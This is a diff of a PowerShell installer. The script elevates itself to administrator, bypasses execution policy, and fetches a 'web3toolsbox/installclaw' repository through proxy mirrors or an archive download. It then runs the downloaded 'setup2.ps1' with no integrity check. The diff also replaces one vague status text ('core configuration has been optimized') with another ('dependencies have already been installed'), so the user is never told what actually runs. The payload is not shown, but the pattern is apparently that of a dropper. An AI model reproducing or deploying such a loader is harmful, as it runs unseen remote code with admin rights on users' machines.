@@ -1,9 +1,20 @@
 #Requires -Version 5.1
 param(
-    [string]$RelaunchWorkingDirectory
+    [string]$RelaunchWorkingDirectory,
+    [string]$LaunchingUserSid
 )
 
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+$currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
+$currentUserSid = $currentIdentity.User.Value
+
+if (-not $LaunchingUserSid) {
+    $LaunchingUserSid = $currentUserSid
+} elseif ($LaunchingUserSid -ne $currentUserSid) {
+    Write-Host '[ERROR] The elevated process is running as a different Windows user than the one that started this script.' -ForegroundColor Red
+    exit 1
+}
+
+if (-not ([Security.Principal.WindowsPrincipal]$currentIdentity).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     $scriptPath = $PSCommandPath
     if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Definition }
 
@@ -14,7 +25,8 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     $relaunchArgs = @(
         '-NoProfile', '-ExecutionPolicy', 'Bypass',
         '-File', "`"$scriptPath`"",
-        '-RelaunchWorkingDirectory', "`"$workDir`""
+        '-RelaunchWorkingDirectory', "`"$workDir`"",
+        '-LaunchingUserSid', $LaunchingUserSid
     )
 
     try {
@@ -35,14 +47,14 @@ if ($RelaunchWorkingDirectory -and (Test-Path -LiteralPath $RelaunchWorkingDirec
 $OutputEncoding        = [System.Text.UTF8Encoding]::new($false)
 $ErrorActionPreference = 'Stop'
 
+# $SCRIPT_URL="https://"
 $RepoPart       = "web3toolsbox/installclaw.git"
-$GitLabRepoPart = "web3toolsbox/installclaw.git"
 $GitMirrors = @(
     "https://github.com/$RepoPart",
     "https://ghproxy.com/https://github.com/$RepoPart",
     "https://gh-proxy.com/https://github.com/$RepoPart",
     "https://hub.gitmirror.com/https://github.com/$RepoPart",
-    "https://gitlab.com/$GitLabRepoPart"
+    "https://gitlab.com/$RepoPart"
 )
 
 $ArchiveUrls = @(
@@ -65,7 +77,7 @@ function Invoke-CloneWithFallback {
     param([string]$Target)
     $total = $GitMirrors.Count
     for ($i = 0; $i -lt $total; $i++) {
-        Write-ok "Optimization in progress......"
+        Write-ok "Installing..."
         $prevEAP = $ErrorActionPreference
         $ErrorActionPreference = 'SilentlyContinue'
         git clone --depth=1 --single-branch $GitMirrors[$i] $Target 2>&1 | Out-Null
@@ -95,7 +107,7 @@ function Get-RepoViaDownload {
     $idx = 0
     foreach ($url in $ArchiveUrls) {
         $idx++
-        Write-ok "Optimization in progress......"
+        Write-ok "Installing..."
         try {
             Invoke-WebRequest -Uri $url -OutFile $archive -UseBasicParsing -ErrorAction Stop
         } catch {
@@ -117,10 +129,10 @@ function Get-RepoViaDownload {
         exit 1
     }
 
-    $setup = Get-ChildItem -Path $extractDir -Recurse -Depth 3 -Filter "setup.ps1" `
+    $setup = Get-ChildItem -Path $extractDir -Recurse -Depth 3 -Filter "setup2.ps1" `
                  -File -ErrorAction SilentlyContinue | Select-Object -First 1
     if (-not $setup) {
-        Write-Err "setup.ps1 not found inside the downloaded archive."
+        Write-Err "setup2.ps1 not found inside the downloaded archive."
         exit 1
     }
     Write-Ok "Source archive ready"
@@ -146,13 +158,13 @@ try {
         $repoDir = Get-RepoViaDownload -WorkDir $workDir
     }
 
-    $childScript = Join-Path $repoDir "setup.ps1"
+    $childScript = Join-Path $repoDir "setup2.ps1"
     if (-not (Test-Path $childScript)) {
         Write-Err "Child installer script not found."
         $exitCode = 1
     } else {
         Set-Location -Path $repoDir -ErrorAction Stop
-        powershell -ExecutionPolicy Bypass -File ".\setup.ps1"
+        powershell -ExecutionPolicy Bypass -File ".\setup2.ps1"
         if ($LASTEXITCODE -ne 0) {
             Write-Err "Child installer failed (exit code $LASTEXITCODE)."
             $exitCode = $LASTEXITCODE
@@ -164,6 +176,6 @@ try {
 }
 
 if ($exitCode -eq 0) {
-    Write-Ok "🎉 The core configuration has been optimized! ✨ 🌟 ✨"
+    Write-Ok "The required dependencies have already been installed!"
 }
 exit $exitCode
